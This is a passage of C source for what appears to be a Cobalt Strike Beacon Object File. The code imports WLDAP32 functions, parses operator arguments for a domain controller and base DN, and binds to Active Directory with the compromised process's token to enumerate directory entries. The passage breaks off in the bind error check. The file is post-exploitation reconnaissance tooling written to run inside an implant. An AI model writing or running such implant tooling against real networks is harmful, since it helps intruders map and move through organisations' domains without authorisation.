#include <windows.h>
#include <winldap.h>
#include "beacon.h"

DECLSPEC_IMPORT LDAP*       LDAPAPI WLDAP32$ldap_initA(const PSTR, ULONG);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_bind_sA(LDAP*, const PSTR, const PSTR, ULONG);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_search_sA(LDAP*, const PSTR, ULONG, const PSTR, PZPSTR, ULONG, LDAPMessage**);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_count_entries(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_next_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PCHAR*      LDAPAPI WLDAP32$ldap_get_valuesA(LDAP*, LDAPMessage*, const PSTR);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_count_valuesA(PCHAR*);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_value_freeA(PCHAR*);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_unbind(LDAP*);
DECLSPEC_IMPORT ULONG       LDAPAPI WLDAP32$ldap_set_option(LDAP*, int, const void*);

/* convert FQDN dc.corp.local -> DC=corp,DC=local is the operator's job;
   here we accept the base DN directly as an argument */

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char* dc      = BeaconDataExtract(&parser, NULL);   /* e.g. "10.0.0.1" or DC hostname, NULL = serverless bind */
    char* baseDN  = BeaconDataExtract(&parser, NULL);   /* e.g. "DC=corp,DC=local" */

    if (!baseDN || baseDN[0] == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Base DN required (e.g. DC=corp,DC=local)");
        return;
    }

        LDAP* ld = WLDAP32$ldap_initA((dc && dc[0]) ? dc : NULL, LDAP_PORT);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed");
        return;
    }

    ULONG version = LDAP_VERSION3;
    WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

    /* bind as the current process token (SSPI/Negotiate) */
    ULONG rc = WLDAP32$ldap_bind_sA(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_S
